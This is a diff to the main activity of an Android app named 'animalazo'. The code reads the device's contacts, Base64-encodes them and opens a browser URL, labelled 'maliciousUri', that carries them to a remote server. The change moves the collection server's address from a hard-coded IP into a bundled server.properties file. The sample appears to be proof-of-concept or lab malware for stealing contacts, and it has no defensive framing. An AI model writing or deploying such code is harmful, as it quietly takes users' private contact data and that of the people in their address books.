@@ -1,6 +1,7 @@
 package com.example.animalazo;
 
 import java.util.ArrayList;
+import java.util.Properties;
 
 import android.app.Activity;
 import android.content.Intent;
@@ -8,11 +9,8 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.ContactsContract;
-import android.provider.ContactsContract.Contacts;
-import android.provider.ContactsContract.RawContacts;
 import android.util.Base64;
 import android.view.Menu;
-import android.widget.TextView;
 
 public class MainActivity extends Activity {
 
@@ -61,7 +59,7 @@ public class MainActivity extends Activity {
 	}
 
 	public void sendContactsThroughBrowser(String contactsCollapsed) {
-		Uri maliciousUri = Uri.parse("http://192.168.33.1:4567/" + Base64.encodeToString(contactsCollapsed.getBytes(),Base64.NO_WRAP));
+		Uri maliciousUri = Uri.parse("http://" + this.getAddress() + "/" + Base64.encodeToString(contactsCollapsed.getBytes(),Base64.NO_WRAP));
 		Intent launchBrowser = new Intent(Intent.ACTION_VIEW, maliciousUri);
 		startActivity(launchBrowser);
 	}
@@ -90,5 +88,15 @@ public class MainActivity extends Activity {
 		return contacts;
 
 	}
-
+	
+	private String getAddress() {
+		try {
+			Properties properties = new Properties();
+			properties.load(this.getAssets().open("server.properties"));
+			return properties.getProperty("address");
+		} catch (Exception e) {
+			return null;
+		}
+	}
+	
 }
